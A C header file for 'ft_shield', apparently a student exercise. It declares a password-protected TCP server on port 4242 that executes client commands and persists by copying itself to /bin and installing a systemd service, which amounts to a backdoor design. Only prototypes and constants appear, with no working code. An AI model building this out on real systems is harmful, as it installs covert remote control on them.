#ifndef TCP_SERVER_H
#define TCP_SERVER_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <time.h>


#define PORT 4242
#define BUFFER_SIZE 1024
#define MAX_CLIENTS 3
#define AUTH_PASSWORD_HASH "8fb9f8fd"
#define SECRET_KEY 54
#define SOURCE_FILE "ft_shield"
#define DEST_FILE "/bin/ft_shield"
#define SERVICE_NAME "ft_shield.service"

int create_server_socket();
void bind_and_listen(int server_fd, struct sockaddr_in* address);
int handle_new_connection(int server_fd, struct sockaddr_in* address, int *client_socket, int addrlen);
void handle_client_data(int *client_socket, int socket_id, char *buffer, struct sockaddr_in* address, int addrlen);
void execute_command(const char* command, int client_socket);
int authenticate_client(int client_socket);
void hash(const char *password, char *hash);
void ensure_single_instance();
void create_daemon();
void copy_binary_file(const char *sourcePath, const char *destinationPath);
void create_systemd_service(const char* service_name, const char* binary_path);
void enable_and_start_service(const char* service_name);
void run_server(int server_fd, int *client_socket, struct sockaddr_in addr);
#endif












